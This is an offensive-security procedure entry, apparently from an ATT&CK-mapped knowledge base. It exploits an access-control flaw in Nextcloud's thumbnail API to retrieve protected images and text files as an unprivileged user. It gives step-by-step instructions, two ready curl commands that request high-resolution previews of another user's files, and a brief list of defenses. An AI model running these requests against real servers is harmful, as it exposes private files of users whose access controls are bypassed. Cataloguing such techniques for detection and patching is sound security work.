---
id: proc-uuid-4
tags:
  - thumbnail-api
  - file-disclosure
  - nextcloud
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/thumbnail-image-curl]]'
  - '[[commands/thumbnail-text-curl]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Automated Collection]]'
updated_at: '2025-12-14T17:28:58.697Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Automated Collection]]'
---
# Access-Protected-File-Thumbnails-via-API

## Summary

This procedure exploits the files API thumbnail endpoint to fetch high-resolution previews of protected image files and text file renders as unprivileged user, bypassing access controls since permissions are not checked during on-demand generation or cached access.

## Description

Using file paths from WebDAV search, request thumbnails at /index.php/apps/files/api/v1/thumbnail/{width}/{height}/{path} with form-urlencoded content type. For images, get full-res (e.g., 1212x750); for text, if owner viewed in web (generating 4096x4096 PNG), access the preview exposing content. Root cause: No permission enforcement on preview API. Impact: Sensitive data leakage via images.

## Requirements

1. File paths from WebDAV search
2. Unprivileged user credentials
3. Owner has viewed text files for preview generation (for text)
4. curl on client

## Defense

Defensive measures and detection strategies:

- Update Nextcloud to enforce access rules on thumbnail API
- Disable on-demand thumbnail generation for protected files
- Cache previews with permission tokens
- Monitor API logs for thumbnail requests to denied paths

## Objectives

1. Retrieve image contents at high resolution
2. Expose text file data via PNG previews
3. Demonstrate full bypass of file protections

## Instructions

### Step 1: Identify Target File

**Context**: From data.xml, select image or text file path.

Example: Secret_Folder/Secret_Subfolder/Secret_Picture.jpeg (image/jpeg).

> Note MIME type to choose endpoint params.

### Step 2: Fetch Image Thumbnail

**Context**: Request high-res thumbnail for protected image, saving as JPEG.

**Command** ([[commands/thumbnail-image-curl]]):

```bash
curl -u user 'https://example.com/index.php/apps/files/api/v1/thumbnail/1212/750/Secret_Folder/Secret_Subfolder/Secret_Picture.jpeg' -H 'Content-Type: application/x-www-form-urlencoded' > Secret_Picture.jpeg
```

> Fetches 1212x750 preview without permission check. Expected output: Secret_Picture.jpeg with full image contents.

### Step 3: Fetch Text File Preview (If Applicable)

**Context**: For text files pre-viewed by owner, request large PNG render.

**Command** ([[commands/thumbnail-text-curl]]):

```bash
curl -u user 'https://example.com/index.php/apps/files/api/v1/thumbnail/4096/4096/Secret_Folder/Secret_Subfolder/Secret_Text.txt' -H 'Content-Type: application/x-www-form-urlencoded' > Secret_Text.png
```

> Generates or retrieves PNG of text content. Expected output: Secret_Text.png showing readable sensitive text.

### Step 4: Verify Contents

**Context**: Open downloaded files to confirm exposure.

Use image viewer or text extractor from PNG.

> Success if protected data visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Automated Collection]] Automated Collection

### Sub-Techniques


## Commands Used

- [[commands/thumbnail-image-curl]]
- [[commands/thumbnail-text-curl]]

## Tools Used

- [[tools/curl]]

## Tags

- thumbnail-api
- file-disclosure
- nextcloud
